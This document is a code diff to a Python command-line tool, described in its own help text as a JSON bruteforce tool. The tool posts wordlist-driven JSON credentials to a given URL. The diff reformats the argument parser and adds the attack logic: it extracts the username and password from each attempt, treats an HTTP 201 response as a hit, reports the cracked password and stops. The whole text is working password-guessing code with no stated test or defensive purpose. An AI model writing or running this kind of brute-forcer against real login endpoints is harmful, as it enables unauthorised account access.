@@ -6,15 +6,9 @@ from json import loads
 import sys
 
 parser = argparse.ArgumentParser(description="A simple JSON bruteforce tool.")
-parser.add_argument(
-    "--url", type=str, required=True, help="The URL to post the data to."
-)
-parser.add_argument(
-    "--data", type=str, required=True, help="The JSON data to post."
-)
-parser.add_argument(
-    "--wordlist", type=str, required=True, help="The wordlist to use to fuzz."
-)
+parser.add_argument("--url", type=str, required=True, help="The URL to post the data to.")
+parser.add_argument("--data", type=str, required=True, help="The JSON data to post.")
+parser.add_argument("--wordlist", type=str, required=True, help="The wordlist to use to fuzz.")
 args = parser.parse_args()
 
 
@@ -72,9 +66,18 @@ if __name__ == "__main__":
             json = json.replace("'", "\"")
             json = loads(json)
 
+            username = json["username"]
+            password = json["password"]
+
             request = requests.post(args.url, headers=headers, json=json)
 
-            print(json)
+            if request.status_code != 201:
+                pass
+            else:
+                log.success(f"Password for user {username} found: {password}")
+                sys.exit()
         except requests.ConnectionError:
             log.error(f"Failed to connect to {args.url}")
             sys.exit()
+    else:
+        log.warning(f"Password for user {username} not found")
